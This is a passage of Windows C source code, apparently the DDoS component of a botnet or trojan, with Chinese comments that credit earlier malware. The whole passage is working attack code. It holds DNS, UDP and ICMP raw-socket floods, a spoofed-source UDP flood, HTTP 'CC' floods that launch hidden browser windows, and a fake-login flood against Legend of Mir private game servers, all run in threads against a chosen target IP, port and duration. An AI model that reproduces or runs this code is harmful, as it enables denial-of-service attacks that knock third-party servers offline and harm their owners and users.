					u_char *pseudo,pseudoHead[44] = {0};//伪头部用于计算udp校验和
					pseudo=pseudoHead;
					memcpy(pseudo,&(dns_data.ip.ip_src),8);
					pseudo+=9; 
					memcpy(pseudo,&(dns_data.ip.ip_p),1);
					pseudo++;
					memcpy(pseudo,&(dns_data.udp.udp_len),2);
					pseudo+=2;
					memcpy(pseudo,&(dns_data.udp),sizeof(struct udpheader));
					pseudo+=8;
					memcpy(pseudo,&(dns_data.dnshead),sizeof(HEADER));
					pseudo+=12;
					memcpy(pseudo,&(dns_data.dnsbuf),11);//strlen(dns_data.dnsbuf));
					dns_data.udp.udp_sum=checksum((u_short *)pseudoHead,44);
					
					nRet = sendto(s, (char *)&dns_data, 51, 0, (struct sockaddr *)&Sin, sizeof(struct sockaddr_in));//发送数据包
				}
	}
	
	WSACleanup();
	return 0;
}

void DNS_ATT(char ip[500],char dns[500],int time)
{
	strcpy(tgtIP,ip);
	strcpy(tgtNDS,dns);
//	OutputDebugString(tgtIP);
	stoptime = time;
	if (stoptime!=0)
	{
		CloseHandle(CreateThread(NULL,NULL,DdosTime,NULL,NULL,NULL));//激活
	}
    stopfuck=false;	
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)DnsIpFlood, NULL, 0, NULL);
	return ;
}


//--------------------------------------破防CC		==12	暴风7.0---------------------------------------
BOOL FindIePath(OUT char *IePath) 
{ 
	char szSystemDir[MAX_PATH]; 
	GetSystemDirectoryA(szSystemDir,MAX_PATH); 
	
	szSystemDir[2] = '\0'; 
	lstrcatA(szSystemDir,"\\Program Files\\Internet Explorer\\iexplore.exe"); 
	lstrcpyA(IePath, szSystemDir); 
	return TRUE; 
}
//TCP连接
SOCKET tcpConnect(DWORD host, int port)
{
    SOCKET sock;
	
    sock = socket(AF_INET, SOCK_STREAM, 0);
	
    if(sock == INVALID_SOCKET)
        return sock;
	
    sockaddr_in sin;
	
    sin.sin_addr.s_addr = host;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
	
	if(connect(sock, (sockaddr *)&sin, sizeof(sin)) == SOCKET_ERROR)
    {
        closesocket(sock);
        return INVALID_SOCKET;
    }
	
    return sock; 
}

unsigned long  CALLBACK breakcc(LPVOID dParam)
{
	SOCKET	MySocket;//套接字
	char     strTemp[0x400]={0};
	char     strHost[MAX_PATH]={0};
	char     strParam[MAX_PATH]={0};
	char    *pstrTemp=NULL;
	char    *pstrTemp2=NULL;
	BYTE     byBuffer[1024]={0};
	int      nTemp;
	
	char PnDFs[] = {'h','t','t','p',':','/','/','\0'};
	strcpy(strTemp,tgtIP);

    if ( strstr(strTemp, PnDFs) )
		pstrTemp = strTemp+strlen(PnDFs);

	if ( strstr(pstrTemp, "/") )
	{
		memset(strHost, 0, sizeof(strHost));
		nTemp = strcspn(pstrTemp, "/");
		strncpy(strHost, pstrTemp, nTemp);
		pstrTemp2 = &pstrTemp[strcspn(pstrTemp, "/")];
		memset(strParam, 0, sizeof(strParam));
		strcpy(strParam, pstrTemp2);
	}
    if ( strlen(strParam)< 2 )
		 strcpy(strParam, "/");

	char url[1024]={0},IEPath[128]={0};
	FindIePath(IEPath);
	wsprintf(url,"%s %s%s",IEPath,strHost,strParam);
	PROCESS_INFORMATION PI;
	STARTUPINFO SI={sizeof(SI)};
	SI.dwFlags|= STARTF_USESHOWWINDOW;
	SI.wShowWindow=SW_HIDE;

	int nRet=CreateProcessA(NULL,url,NULL,NULL,NULL,0,NULL,NULL,&SI,&PI);
	if(nRet!=0)
	{
		Sleep(5000);
		TerminateProcess(PI.hProcess,0); 
	}
	if(tgtPort==80)
	{
		wsprintf(url,
				"GET %s HTTP/1.1\r\n"             
				"Content-Type: text/html"
				"\r\nHost: %s"
				"\r\nAccept: text/html, */*"
				"\r\nUser-Agent:Mozilla/4.0 (compatible; MSIE %d.00; Windows NT %d.0; MyIE 3.01)"
				"\r\n\r\n",
				strParam,
				strHost,
				SEU_Rand(2)+7,
				SEU_Rand(2)+5);
	}
	else
	{
		wsprintf(url,
				"GET %s HTTP/1.1\r\n"             
				"Content-Type: text/html"
				"\r\nHost: %s:%d"
				"\r\nAccept: text/html, */*"
				"\r\nUser-Agent:Mozilla/4.0 (compatible; MSIE %d.00; Windows NT %d.0; MyIE 3.01)"
				"\r\n\r\n",
				strParam,
				strHost,
				tgtPort,						
				SEU_Rand(2)+7,
				SEU_Rand(2)+5);
	}

	while (1)
	{		
		if(stopfuck==1)
		{
			ExitThread(0);
			return 0;
		}
	    SOCKET S=tcpConnect(resolve(strHost),tgtPort);
		send(S,url,strlen(url)+1,0);
		closesocket(S);
		Sleep(10);
	}
	return 0;
}

void Break_CC(char ip[30],int port,int time,int xc)
{
	strcpy(tgtIP,ip);

 	tgtPort = port;   //目标端口
	stoptime = time;
	if (stoptime!=0)
	{
		CloseHandle(CreateThread(NULL,NULL,DdosTime,NULL,NULL,NULL));//激活
	}
	stopfuck=false;//TRUE停止攻击

	for(int i=0;i<xc;i++)  //循环创建线程
	{
		h[i]=CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)breakcc, NULL, 0, NULL);  //具体攻击
	}
}

//------------------------------------UDP Flood		==1		Gh0st版DK--------------------------------------------------
unsigned long  CALLBACK udpflood(LPVOID dParam)
{
	WSADATA WSAData;
	WSAStartup(MAKEWORD(2,2) ,&WSAData);
	unsigned int saddr=0;
	char hostname[MAX_PATH];
	gethostname(hostname,MAX_PATH);
	LPHOSTENT lphost;
	lphost = gethostbyname(hostname);
	if (lphost != NULL)	saddr = ((LPIN_ADDR)lphost->h_addr)->s_addr;
	IP_HEADER ipHeader;
	UDP_HEADER udpHeader;
	int iUdpCheckSumSize;
	char *ptr=NULL;
	char pSendBuffer[nBufferSize+60];
	int  iTotalSize=0;
	char pBuffer[nBufferSize];
	FillMemory(pBuffer, nBufferSize, 'A');
	iTotalSize=sizeof(ipHeader) + sizeof(udpHeader)+ nBufferSize;
	ipHeader.h_verlen = (4 << 4) | (sizeof(ipHeader) / sizeof(unsigned long));
	ipHeader.tos=0;
	ipHeader.total_len=htons(iTotalSize);
	ipHeader.ident=0;
	ipHeader.frag_and_flags=0;
	ipHeader.ttl=128;
	ipHeader.proto=IPPROTO_UDP;
	ipHeader.checksum=0;
	ipHeader.destIP=inet_addr(tgtIP);
	udpHeader.sourceport = htons(5444);
	udpHeader.destport = htons(tgtPort);
	udpHeader.udp_length = htons(sizeof(udpHeader) + nBufferSize);
	udpHeader.udp_checksum = 0;
	ptr = NULL;
	ipHeader.sourceIP = saddr;
	ZeroMemory(pSendBuffer, nBufferSize + 60);
	ptr = pSendBuffer;
	iUdpCheckSumSize=0;
	udpHeader.udp_checksum = 0;
	memcpy(ptr, &ipHeader.sourceIP, sizeof(ipHeader.sourceIP));
	ptr += sizeof(ipHeader.sourceIP);
	iUdpCheckSumSize += sizeof(ipHeader.sourceIP);
	memcpy(ptr, &ipHeader.destIP, sizeof(ipHeader.destIP));
	ptr += sizeof(ipHeader.destIP);
	iUdpCheckSumSize += sizeof(ipHeader.destIP);
	ptr++;
	iUdpCheckSumSize++;
	memcpy(ptr, &ipHeader.proto, sizeof(ipHeader.proto));
	ptr += sizeof(ipHeader.proto);
	iUdpCheckSumSize += sizeof(ipHeader.proto);
	memcpy(ptr, &udpHeader.udp_length, sizeof(udpHeader.udp_length));
	ptr += sizeof(udpHeader.udp_length);
	iUdpCheckSumSize += sizeof(udpHeader.udp_length);
	memcpy(ptr, &udpHeader, sizeof(udpHeader));
	ptr += sizeof(udpHeader);
	iUdpCheckSumSize += sizeof(udpHeader);
	memcpy(ptr, pBuffer, nBufferSize);
	iUdpCheckSumSize += nBufferSize;
	udpHeader.udp_checksum=checksum((USHORT*)pSendBuffer,iUdpCheckSumSize);
	memcpy(pSendBuffer, &ipHeader, sizeof(ipHeader));
	memcpy(pSendBuffer + sizeof(ipHeader), &udpHeader, sizeof(udpHeader));
	memcpy(pSendBuffer + sizeof(ipHeader) + sizeof(udpHeader), pBuffer, nBufferSize);
	SOCKET SendSocket = WSASocket(AF_INET,SOCK_RAW,IPPROTO_UDP,NULL,0,0);
	BOOL Flag=true;
	if (setsockopt(SendSocket,IPPROTO_IP,IP_HDRINCL,(char*)&Flag,sizeof(Flag))==SOCKET_ERROR)return 0;
	SOCKADDR_IN addr_in;
	addr_in.sin_family=AF_INET;
	addr_in.sin_port=htons(tgtPort);
	addr_in.sin_addr.s_addr = inet_addr(tgtIP);
	for (;;){
		for(int i=0;i<5;i++)
			sendto(SendSocket, pSendBuffer, iTotalSize, 0, (SOCKADDR *)&addr_in, sizeof(addr_in));
		Sleep(15);
		if (stopfuck==true)break;
	}
 	closesocket(SendSocket);
 	WSACleanup();
	return 0;
}

void UDP_FLOOD(char ip[30],int port,int time,int xc)
{
	//转换IP
	if (inet_addr(ip)== INADDR_NONE)
	{
		struct hostent *hp = NULL;
		if ((hp = gethostbyname(ip)) != NULL)
		{
			in_addr in;
			memcpy(&in, hp->h_addr, hp->h_length);
			strcpy(tgtIP,inet_ntoa(in));
		}
	}
	else
		strcpy(tgtIP,ip);

	tgtPort = port;  //攻击端口
	stoptime = time;
	if (stoptime!=0)
	{
		CloseHandle(CreateThread(NULL,NULL,DdosTime,NULL,NULL,NULL));//激活
	}
	stopfuck=false;//TRUE停止攻击

		for(int i=0;i<xc;i++)  //循环创建线程
	{
		h[i]=CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)udpflood, NULL, 0, NULL);  //具体攻击
	}
}

//-------------------------------------ICMP洪水		==3		NB5.4代码-----------------------------------------------
void fill_icmp_data(char *icmp_data, int datasize)
{
	ICMP_HEADER *icmp_hdr;
	char       *datapart;
	icmp_hdr = (ICMP_HEADER*)icmp_data;
	icmp_hdr->i_type = ICMP_ECHO;
	icmp_hdr->i_code = 0;
	icmp_hdr->i_id   = (USHORT)GetCurrentProcessId();
	icmp_hdr->i_cksum = 0;
	icmp_hdr->i_seq = 0;
	
	datapart = icmp_data + sizeof(ICMP_HEADER);
	memcpy(datapart,icmpBuffer,strlen(icmpBuffer));
}

unsigned long  CALLBACK icmpflood(LPVOID dParam)
{
	char all[MAX_PATH],ip[32],port[6],url[32],*point=NULL;
	
	strcpy(all,tgtIP);
	point=all;
	if(!strstr(all,"http://"))
	{
		strcpy(ip,tgtIP);
	}

	if(strstr(all,"http://")!=NULL)
	{
		point=point+strlen("http://");
		memset(ip,0,sizeof(ip));
		strcpy(ip,point);
	}
	if(strstr(point,":")!=NULL)
	{
		memset(ip,0,sizeof(ip));
		strncpy(ip,point,strcspn(point,":"));
		point=point+strcspn(point,":")+1;
		if(strstr(point,"/")!=NULL)
		{
			memset(port,0,sizeof(port));
			strncpy(port,point,strcspn(point,"/"));
			point=point+strcspn(point,"/");
			memset(url,0,sizeof(url));
			strcpy(url,point);
		}
	}
	else
	{
		if(strstr(point,"/")!=NULL)
		{
			memset(ip,0,sizeof(ip));
			strncpy(ip,point,strcspn(point,"/"));
			point=point+strcspn(point,"/");
			memset(url,0,sizeof(url));
			strcpy(url,point);
		}
	}
	int ErrorCode;
    
	SOCKET SockRaw=(SOCKET)NULL;
	if((SockRaw=WSASocket(AF_INET,SOCK_RAW,
		IPPROTO_ICMP,NULL,0,WSA_FLAG_OVERLAPPED))==INVALID_SOCKET)
	{
		return 0;
	}
	
	int TimeOut=2000;
	ErrorCode=setsockopt(SockRaw,SOL_SOCKET,SO_SNDTIMEO,(char*)&TimeOut,sizeof(
		TimeOut));
	if (ErrorCode==SOCKET_ERROR)
	{
		return 0;
	}
	
	struct sockaddr_in icmpsock;
	memset(&icmpsock,0,sizeof(icmpsock));
	icmpsock.sin_family=AF_INET;
	icmpsock.sin_addr.s_addr=inet_addr(ip);

	int nnn;
    if((nnn=inet_addr(ip))<0)
	{
		struct hostent *he;
		if((he=gethostbyname(ip))!=NULL)
		{
            icmpsock.sin_addr.s_addr=*(unsigned long *)he->h_addr;
		}
	}
	
	ICMP_HEADER icmp_header;
    icmp_header.i_type = 8;
	icmp_header.i_code = 0;
    icmp_header.i_cksum = 0;
    icmp_header.i_id = 2;
    icmp_header.timestamp = GetTickCount();
    icmp_header.i_seq=999;
	
	srand((unsigned)time( NULL ));

    int PacketSize=32;
	PacketSize=27;

    char SendBuf[800]={0}; 
    memcpy(SendBuf,&icmp_header,sizeof(icmp_header));
    memset(SendBuf+sizeof(icmp_header),rand()%300,PacketSize);
	
	int datasize;
    datasize=sizeof(icmp_header)+PacketSize;
	
	int seq_no=0;
	while(!stopfuck)
	{
		((ICMP_HEADER*)SendBuf)->i_cksum = 0;
		((ICMP_HEADER*)SendBuf)->i_seq =	seq_no++;
		((ICMP_HEADER*)SendBuf)->timestamp = GetTickCount();
		((ICMP_HEADER*)SendBuf)->i_cksum = checksum((USHORT*)SendBuf,800);
		
		int nRet=sendto(SockRaw,SendBuf,datasize,0,(struct sockaddr*)&icmpsock,
			sizeof(icmpsock));
		if(nRet==SOCKET_ERROR)
		{
			ExitThread(0);
			return 0;
		}
	}

	Sleep(50);
	closesocket(SockRaw);
	WSACleanup();
    ExitThread(0);
	return 0;
}

void ICMP_FLOOD(char ip[30],int port,int time,int xc)
{
	if (inet_addr(ip)== INADDR_NONE)     //转换IP地址
	{
		struct hostent *hp = NULL;
		if ((hp = gethostbyname(ip)) != NULL)
		{
			in_addr in;
			memcpy(&in, hp->h_addr, hp->h_length);
			strcpy(tgtIP,inet_ntoa(in));
		}
	}
	else
		strcpy(tgtIP,ip);

	tgtPort=port;   //端口
	stoptime = time;
	if (stoptime!=0)
	{
		CloseHandle(CreateThread(NULL,NULL,DdosTime,NULL,NULL,NULL));//激活
	}

    stopfuck=false;//TRUE停止攻击

	for(int i=0;i<xc;i++)
	{
			h[i]=CreateThread(0,0,(LPTHREAD_START_ROUTINE)icmpflood,NULL,0,NULL);
	}
}

//--------------------------------传奇私服攻击	==5		NB5.4代码----------------------------------
unsigned long  CALLBACK sfsf(LPVOID dParam)
{
	WSADATA               WSAData;
	WSAStartup(MAKEWORD(2,2) ,&WSAData);
	SOCKADDR_IN sockAddr;
	SOCKET	m_hSocket;
	m_hSocket = socket(PF_INET,SOCK_STREAM,0);
	memset(&sockAddr,0,sizeof(sockAddr));
	sockAddr.sin_family = AF_INET;
	sockAddr.sin_port=htons(tgtPort);
	sockAddr.sin_addr.S_un.S_addr=inet_addr(tgtIP);
	
	
	MMSG *pmsg;
    pmsg=(MMSG*)malloc(sizeof(MMSG));
    memset(pmsg,0,sizeof(MMSG));
	pmsg->wCmd=0x07d1;
	
	int nSize = 0,RandSize;
	char name[22],pass[10],tempdata[128],Senddata[128];
	memset(name,0,22);
	memset(pass,0,10);
	memset(tempdata,0,128);
	memset(Senddata,0,128);
	
	while(!stopfuck)
	{	
		do 
		{
			RandSize=SEU_Rand(20);
		} while(RandSize<5);
		for(int i=0;i<RandSize;i++)
		{
			name[i]=table[SEU_Rand(36)];
		}
		for(int i=0;i<9;i++)
		{
			pass[i]=table[SEU_Rand(36)];
		}
		sprintf(pmsg->data,"%s/%s",name,pass);
		RandSize = strlen(pmsg->data) +12;
		Mir2EnCode((BYTE *)pmsg,RandSize,(BYTE *)tempdata,nSize);
		sprintf(Senddata,"#0%s!",tempdata);
		if (connect(m_hSocket,(SOCKADDR*)&sockAddr, sizeof(sockAddr)) != 0)
		{
			closesocket(m_hSocket);
			continue;
		}
		if(SOCKET_ERROR==send(m_hSocket,Senddata,strlen(Senddata),0))
			continue;
		
		recv(m_hSocket,tempdata,128,0);
		closesocket(m_hSocket);
	}
	
    ExitThread(0);
	return 0;
}

void SF_SF(char ip[30],int port, int time,int xc)  //私服攻击
{   
	//IP                   时间     线程   攻击数据
	if (inet_addr(ip)== INADDR_NONE)
		//inet_addr将ip地址转换成网络地址   INADDR_NONE非法地址
	{
		struct hostent *hp = NULL;  //hostent  IP信息结构体
		if ((hp = gethostbyname(ip)) != NULL)  //gethostbyname主机信息
		{
			in_addr in;  //IP地址转换位一个in_addr结构的地址
			memcpy(&in, hp->h_addr, hp->h_length);  //复制内存
			//hp->h_length地址的比特长度
			strcpy(tgtIP,inet_ntoa(in));  //复制数据
		}
	}
	else
		strcpy(tgtIP,ip);   //复制数据 
	
	tgtPort = port;   //目标端口
	stoptime = time;
	if (stoptime!=0)
	{
		CloseHandle(CreateThread(NULL,NULL,DdosTime,NULL,NULL,NULL));//激活
	}
	stopfuck=false;
	for(int i=0;i<xc;i++)  //循环创建线程 太占资源了 恢复原始
	{
		h[i]=CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)sfsf, NULL, 0, NULL);  //
	}
	
} 

//------------------------------------------伪造源UDP(流量)	UDP		==7		暴风7.0------------------------------------------------------
unsigned long  CALLBACK wg_break(LPVOID dParam)
{
	IP_HEADER  ipHeader;
	UDP_HEADER udpHeader;

	char pSendBuffer[1024]={0};
	BOOL               flag=1; 
	memset(pSendBuffer,'A',1024);
	
	SOCKADDR_IN udpaddr;
	SOCKET sendSocket;
	udpaddr.sin_family=AF_INET;
    udpaddr.sin_addr.s_addr=resolve(tgtIP);
    udpaddr.sin_port=htons(tgtPort);
	
    if((sendSocket = WSASocket(AF_INET, SOCK_RAW, IPPROTO_RAW, NULL, 0, WSA_FLAG_OVERLAPPED)) == INVALID_SOCKET) 
        return 0; 
	
	char src_ip[20] = {0};
	
	while (1)
    {		
		if(stopfuck==1)
		{
			ExitThread(0);
			return 0;
		}
		for(int a=0;a<24;a++)
		{
			int iTotalSize=sizeof(ipHeader) + sizeof(udpHeader)+ nBufferSize;
			wsprintf( src_ip, "%d.%d.%d.%d", SEU_Rand(250) + 1, SEU_Rand(250) + 1, SEU_Rand(250) + 1, SEU_Rand(250) + 1 ); 
			//填充IP首部 
			ipHeader.h_verlen = (4 << 4) | (sizeof(ipHeader) / sizeof(unsigned long));
			ipHeader.tos=0;
			ipHeader.total_len=htons(iTotalSize);
			ipHeader.ident=0;
			ipHeader.frag_and_flags=0;
			ipHeader.ttl=128;
			ipHeader.proto=IPPROTO_UDP;
			ipHeader.checksum=0;
			ipHeader.sourceIP=inet_addr(src_ip);//32位源地址
			ipHeader.destIP=resolve(tgtIP);
			//填充UDP首部
			udpHeader.sourceport = htons( SEU_Rand(60000) + 1 );
			udpHeader.destport = htons(tgtPort);
			udpHeader.udp_length = htons(sizeof(udpHeader) + nBufferSize);
			udpHeader.udp_checksum = 0;
			
			memcpy(pSendBuffer, &ipHeader, sizeof(ipHeader));
			memcpy(pSendBuffer+sizeof(ipHeader), &udpHeader, sizeof(udpHeader));
			udpHeader.udp_checksum = checksum( (USHORT *) pSendBuffer, sizeof(udpHeader)+sizeof(ipHeader));
			sendto(sendSocket, pSendBuffer, sizeof(ipHeader) + sizeof(udpHeader) + sizeof(pSendBuffer), 0, (struct sockaddr*)&udpaddr, sizeof(udpaddr)); 
		}
		Sleep(40);
	}
	closesocket(sendSocket);
	WSACleanup();
    ExitThread(0);
	return 0;
}

void WZUDPS(char ip[30],int port,int time,int xc)
{	
	if (inet_addr(ip)== INADDR_NONE)   //转换IP地址
	{
		struct hostent *hp = NULL;
		if ((hp = gethostbyname(ip)) != NULL)
		{
			in_addr in;
			memcpy(&in, hp->h_addr, hp->h_length);
			strcpy(tgtIP,inet_ntoa(in));
		}
	}
	else
		strcpy(tgtIP,ip);
	
	tgtPort = port;   //目标端口
	stoptime = time;
	if (stoptime!=0)
	{
		CloseHandle(CreateThread(NULL,NULL,DdosTime,NULL,NULL,NULL));//激活
	}	
    stopfuck=false;
	for(int i =0;i<xc;i++)
	{
		h[i]=CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)wg_break, NULL, 0, NULL);
	}
	return ;
}

//---------------------------------无限CC测试	==9		DK代码----------------------------------------
unsigned long  CALLBACK nocache_get(LPVOID dParam)
{
	SOCKET	MySocket;//套接字
	char     strTemp[0x400]={0};
	char    *pstrTemp=NULL;
	char    *pstrTemp2=NULL;
	BYTE     byBuffer[1024]={0};
	int      nTemp;
	
	SOCKADDR_IN MySockaddr;	//IP信息结构
	memset(&MySockaddr,0,sizeof(MySockaddr)); //内存空间初始化
	MySockaddr.sin_family = AF_INET;   //代协议族,在socket编程中只能是AF_INET
	MySockaddr.sin_port=htons(tgtPort);  //存储端口号(使用网络字节顺序)
	MySockaddr.sin_addr.S_un.S_addr=resolve(tgtIP);  //将网络地址转换成IP地址
	
	wsprintf(
		(char*)byBuffer,
		"GET / HTTP/1.1\r\nHost: %s:%d\r\nPragma: no-cache\r\nConnection: Keep-Alive\r\n\r\n",
		tgtIP,
		tgtPort);

    int  nCount=strlen((char*)byBuffer);
	while (!stopfuck)
	{
		MySocket = socket(2, 1, 6);
		if ( connect(MySocket, (SOCKADDR*)&MySockaddr, 16) != -1 )
		{
			nTemp=1;
			setsockopt(MySocket, 6, 1,(const char *)&nTemp, sizeof(nTemp));
			nTemp=0;
			setsockopt(MySocket, SOL_SOCKET ,SO_SNDBUF, (const char *)&nTemp, sizeof(nTemp));
			for (int i=0;i<10;i++)
			{
				send(MySocket, (char*)byBuffer,nCount, 0);
				Sleep(1);
			}
			closesocket(MySocket);
			Sleep(30);
		}
		
	}
	
	closesocket(MySocket);
    ExitThread(0);
	return 0;
	
}

void CC_SINCON(char ip[30],int port,int time,int xc)
{
	strcpy(tgtIP,ip);
	
	tgtPort = port;   //目标端口
	stoptime = time;
	if (stoptime!=0)
	{
		CloseHandle(CreateThread(NULL,NULL,DdosTime,NULL,NULL,NULL));//激活
	}
	
    stopfuck=false;
	for(int i=0;i<xc;i++)
	{
		h[i]=CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)nocache_get, NULL, 0, NULL);
	}
}

//停止DDOS
void StopDDOS()
{
	stopfuck=true;
}